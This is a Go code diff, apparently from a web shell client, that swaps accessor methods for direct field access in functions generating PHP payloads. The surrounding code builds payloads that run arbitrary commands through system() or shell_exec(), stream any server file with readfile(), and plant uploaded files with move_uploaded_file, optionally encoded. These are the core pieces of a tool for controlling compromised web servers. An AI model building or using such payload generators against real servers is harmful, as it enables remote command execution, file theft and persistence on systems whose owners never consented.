@@ -22,19 +22,19 @@ func _getShellExecCMD(cmd, letter string) string {
 func CreateCMD(shl *core.SHELLCONFIG) {
 	var contexter, shellCMD string
 
-	if shl.GetScope() != "" {
-		contexter = "cd " + shl.GetScope() + " && "
+	if shl.Scope != "" {
+		contexter = "cd " + shl.Scope + " && "
 	}
 
-	shellCMD = contexter + shl.GetCMD()
+	shellCMD = contexter + shl.Cmd
 
-	if shl.GetMethod() == "system" {
+	if shl.Method == "" || shl.Method == "system" {
 		shellCMD = _getSystemCMD(shellCMD, "r")
-	} else if shl.GetMethod() == "shell_exec" {
+	} else if shl.Method == "shell_exec" {
 		shellCMD = _getShellExecCMD(shellCMD, "r")
 	}
 
-	shl.SetCMD(shellCMD)
+	shl.Cmd = shellCMD
 }
 
 func CreateDownload(dir string, php *core.PHPCONFIG) {
@@ -52,7 +52,7 @@ func CreateDownload(dir string, php *core.PHPCONFIG) {
 
 	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr
 
-	php.SetCMD(cmd)
+	php.Cmd = cmd
 }
 
 func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
@@ -67,7 +67,7 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
 
 	cmd = "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
 
-	if !php.IsRaw() {
+	if !php.Raw {
 		cmd = normalizer.Encode(cmd)
 	}
 
@@ -99,8 +99,8 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
 		return err
 	}
 
-	php.SetCMD(cmd)
-	php.SetBuffer(body)
+	php.Cmd = cmd
+	php.Buffer = body
 
 	return nil
 }
